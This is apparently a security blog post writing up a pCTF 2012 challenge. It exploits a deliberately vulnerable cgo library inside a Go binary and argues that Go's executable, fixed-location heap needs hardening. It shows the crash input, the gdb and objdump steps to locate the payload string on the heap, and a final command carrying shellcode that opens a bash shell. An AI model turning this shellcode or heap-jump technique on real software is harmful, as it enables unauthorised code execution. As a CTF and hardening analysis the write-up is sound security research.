Some debug information can be stripped by passing &lt;tt&gt;-s&lt;/tt&gt; as a command line to the linker (for example, &lt;tt&gt;go build -ldflags "-s" prog.go&lt;/tt&gt;). Note that this does not remove file paths, etc from the binary. It is pretty easy to patch the Go runtime to avoid printing the faulting address and instruction, but that should probably take the form of a real change rather than a quick and dirty patch. Unfortunately, the heap to be seems executable and loaded into fixed location by design (so that closures are easier and that heap addresses do not overlap with valid unicode strings, making the garbage collector easier), so it is not clear that that will be fixed for anytime soon.
&lt;/p&gt;

&lt;h3&gt;Exploiting a Go program&lt;/h3&gt;

&lt;h4&gt;Disclaimer&lt;/h4&gt;

&lt;p&gt;
First things first - I did &lt;em&gt;not&lt;/em&gt; find an exploit in the Go runtime that gave code execution. Instead, I linked the Go binary to a cgo library that had an intentional vulnerability. I had to do some work to make the cgo library exploitable. I made an explicitly vulnerabile C program and specified flags &lt;tt&gt;-fno-stack-protector -U_FORTIFY_SOURCE&lt;/tt&gt; to discard modern protections. Lastly, the behavior I performed in cgo (printing a string to stdout) could have trivially been perfomed in pure Go.
&lt;/p&gt;

&lt;p&gt;
However, I personally feel like Go packages use the unsafe package or are linked against full C libraries commonly enough (consider banthars &lt;a href="https://github.com/banthar/gl"&gt;package&lt;/a&gt; with Go bindings for OpenGl or a &lt;a href="http://go-lang.cat-v.org/library-bindings"&gt;variety&lt;/a&gt; of other packages) that it is irresponsible for the Go runtime to be poorly secured out of the claim that there are no vulnerabilies in Go. Furthermore, the Go runtime should be better secured to avoid the damage from any as of yet undiscovered vulnerabilities in the Go runtime.
&lt;/p&gt;

&lt;p&gt;
Going forward, I will assume that there is a vulnerability (introduced possibly by a vulnerable C library) and will focus on one interesting way to exploit it by using the Go runtime. I will specifically focus on the &lt;a href="webapp"&gt;&lt;tt&gt;webapp&lt;/tt&gt;&lt;/a&gt; problem used in pCTF.
&lt;/p&gt;

&lt;h4&gt;The actual exploit&lt;/h4&gt;

&lt;p&gt;
The Go runtime has some really interesting properties that make it fun to exploit:
&lt;ul&gt;
    &lt;li&gt;The heap is executable.&lt;/li&gt;
    &lt;li&gt;The heap is deterministic and in a fixed location every run&lt;/li&gt;
    &lt;li&gt;Immutable strings tend to end up on the heap&lt;/li&gt;
&lt;/ul&gt;
We will construct an exploit that takes advantage of all of these properties. First, we get get a vulnerability that gives us a crash.
&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp --loglevel&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; --logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAAAAAAA%8d&amp;quot;&lt;/span&gt; --address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;perl -e &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;
&lt;span class="go"&gt;unexpected fault address 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;throw: fault&lt;/span&gt;
&lt;span class="go"&gt;[signal 0xb code=0x1 addr=0x42424242 pc=0x42424242]&lt;/span&gt;

&lt;span class="go"&gt;goroutine 1 [syscall]:&lt;/span&gt;
&lt;span class="go"&gt;levellog._Cfunc_Log(0xb736e0b0, 0xb736e0c8)&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/go-build279009652/levellog/_obj/_cgo_defun.c:50 +0x32&lt;/span&gt;
&lt;span class="go"&gt;levellog.Log(0x1, 0x1883cd00, 0x7f)&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/go-build279009652/levellog/_obj/log.cgo1.go:126 +0x140&lt;/span&gt;
&lt;span class="go"&gt;main.main()&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/build/src/webapp/main.go:21 +0x101&lt;/span&gt;

&lt;span class="go"&gt;goroutine 2 [syscall]:&lt;/span&gt;
&lt;span class="go"&gt;created by runtime.main&lt;/span&gt;
&lt;span class="go"&gt;    /usr/local/src/go/src/pkg/runtime/proc.c:221&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we have code execution (and we know the vulnerable function due to the helpful stack trace), we &lt;tt&gt;objdump&lt;/tt&gt; the function and put a breakpoint before returning to our clobbered return address.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mh"&gt;080624d0&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nf"&gt;Log&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;:&lt;/span&gt;
&lt;span class="x"&gt; 80624d0:       81 ec 9c 00 00 00       sub    $0x9c,%esp&lt;/span&gt;
&lt;span class="x"&gt; 80624d6:       8b 84 24 a4 00 00 00    mov    0xa4(%esp),%eax&lt;/span&gt;
&lt;span class="x"&gt; 80624dd:       89 9c 24 94 00 00 00    mov    %ebx,0x94(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624e4:       e8 4f 00 00 00          call   8062538 &amp;lt;__i686.get_pc_thunk.bx&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 80624e9:       81 c3 17 7b 25 00       add    $0x257b17,%ebx&lt;/span&gt;
&lt;span class="x"&gt; 80624ef:       89 b4 24 98 00 00 00    mov    %esi,0x98(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624f6:       8d 74 24 10             lea    0x10(%esp),%esi&lt;/span&gt;
&lt;span class="x"&gt; 80624fa:       89 44 24 0c             mov    %eax,0xc(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624fe:       8b 84 24 a0 00 00 00    mov    0xa0(%esp),%eax&lt;/span&gt;
&lt;span class="x"&gt; 8062505:       89 34 24                mov    %esi,(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 8062508:       89 44 24 08             mov    %eax,0x8(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 806250c:       8d 83 00 c3 f2 ff       lea    -0xd3d00(%ebx),%eax&lt;/span&gt;
&lt;span class="x"&gt; 8062512:       89 44 24 04             mov    %eax,0x4(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 8062516:       e8 ad 6c 25 00          call   82b91c8 &amp;lt;sprintf@plt&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 806251b:       89 34 24                mov    %esi,(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 806251e:       e8 b5 6c 25 00          call   82b91d8 &amp;lt;puts@plt&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 8062523:       8b 9c 24 94 00 00 00    mov    0x94(%esp),%ebx&lt;/span&gt;
&lt;span class="x"&gt; 806252a:       8b b4 24 98 00 00 00    mov    0x98(%esp),%esi&lt;/span&gt;
&lt;span class="x"&gt; 8062531:       81 c4 9c 00 00 00       add    $0x9c,%esp&lt;/span&gt;
&lt;span class="x"&gt; 8062537:       c3                      ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb webapp
&lt;span class="go"&gt;GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08&lt;/span&gt;
&lt;span class="go"&gt;Copyright (C) 2011 Free Software Foundation, Inc.&lt;/span&gt;
&lt;span class="go"&gt;License GPLv3+: GNU GPL version 3 or later&lt;/span&gt;
&lt;span class="go"&gt;This is free software: you are free to change and redistribute it.&lt;/span&gt;
&lt;span class="go"&gt;There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;and &amp;quot;show warranty&amp;quot; for details.&lt;/span&gt;
&lt;span class="go"&gt;This GDB was configured as &amp;quot;i686-linux-gnu&amp;quot;.&lt;/span&gt;
&lt;span class="go"&gt;For bug reporting instructions, please see:&lt;/span&gt;
&lt;span class="go"&gt;...&lt;/span&gt;
&lt;span class="go"&gt;Reading symbols from /tmp/build/webapp...done.&lt;/span&gt;
&lt;span class="go"&gt;Loading Go Runtime support.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) b *0x8062537&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x8062537&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We run our exploit again, and then search the heap for our string (we know that the heap is always in the range &lt;tt&gt;[0x18600000, 0x18900000]&lt;/tt&gt; for this binary since Go has a deterministic heap).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;(gdb) run --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /tmp/build/webapp --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;[Thread debugging using libthread_db enabled]&lt;/span&gt;
&lt;span class="go"&gt;[New Thread 0xb7ccbb70 (LWP 7869)]&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x08062537 in Log ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xbffff1ac: 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;(gdb) find 0x18600000, 0x18900000, 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;0x1883cd7b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So now we know that our string, which is &lt;tt&gt;:AAAA...AAAABBBB&lt;/tt&gt;, is located at &lt;tt&gt;0x1883cd7b - 4 - 109 = 0x1883cd0e&lt;/tt&gt; on the heap. (Note - this is because string concatenations put strings onto the deterministic heap). But then we are done! We change string to include shell code, and then use our control flow control to jump to it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp -loglevel&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;100&lt;/span&gt; -logfmt&lt;span class="o"&gt;=&lt;/span&gt;AAAAAAAAA%8d -address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;perl -e &lt;span class="s1"&gt;&amp;#39; print &amp;quot;:\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0e\xcd\x83\x18&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :j&lt;/span&gt;
&lt;span class="go"&gt;                Xï¿½Rfh-pï¿½ï¿½Rjhh/bash/binï¿½ï¿½RQSï¿½ï¿½Í€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÍƒ&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;p&gt;
Success!
&lt;/p&gt;
&lt;h3&gt;Postmortem&lt;/h3&gt;
&lt;p&gt;
This exploit is interesting for a number of reasons. First of all, it works on any (32 bit) machine running the same version of Go as the attacker. This is because heap allocations end up being quite deterministic. Next, this type of exploit (jump to an object on the executable heap, such as a string put there via a string concatenation) is something that would be easy to replicate in a variety of Go binaries. Lastly, the executable heap offers an easy surface for heap sprays and other attacks. It is also easy to imagine an expoit that uses a heap overwrite to clobber a closure and get code execution.
&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;
It is also important to note that, while the vulnerability is introduced through C code, common C protections such as NX, ASLR, and libc randomization would make this binary very difficult to exploit without the use of the weak Go runtime. I wish to repeat: &lt;em&gt;this binary is easily exploitable because it is a Go binary&lt;/em&gt;, even assuming ASLR, NX, and libc randomization.
&lt;/p&gt;

&lt;p&gt;
I firmly believe that Go should consider randomizing its heap and making it no longer executable. I also think that it is imperative to provide a compiler option that hardens the binary by disabling the printing of debugging information (stack traces, faulting addresses) on program crashes and stripping debugging / package information from the binary. 
&lt;/p&gt;

&lt;h3&gt;Go Community Response&lt;/h3&gt;

&lt;p&gt;
For anyone who is interested, the Go community's response is &lt;a href="http://groups.google.com/group/golang-nuts/browse_thread/thread/25df6d94d73a8d41"&gt;here&lt;/a&gt;. In summary: vulnerabilities in Go are extremely unlikely so the engineering/complexity overhead required to implement any of these protections is not worth it. I respectfully disagree - vulnerabilities can come from cgo libraries or from as of yet unknown bugs in the Go runtime itself. Furthermore, I suspect that adding ASLR or NX would not require very much effort.
&lt;/p&gt;

&lt;h3&gt;Other writeups&lt;/h3&gt;

&lt;p&gt;
There are writeups of this problem available by:
&lt;ul&gt;
    &lt;li&gt;&lt;a href="http://eindbazen.net/2012/05/plaid-ctf-2012-bunyan/"&gt;Eindbazen&lt;/a&gt; (C style return to libc exploit)&lt;/li&gt;
    &lt;li&gt;&lt;a href="http://www.bases-hacking.org/bunyan-plaidctf2012.html"&gt;w3stormz&lt;/a&gt; (Go heap exploit, in French)&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h3&gt;tl;dr&lt;/h3&gt;

&lt;p&gt;
Go binaries are compiled with a lot of debug info, which some people might want to strip. The Go heap is executable and deterministic, making the exploitation of the pCTF Bunyan problem relatively straightforward.
&lt;/p&gt;</content><category term="golang"></category><category term="exploitation"></category></entry></feed>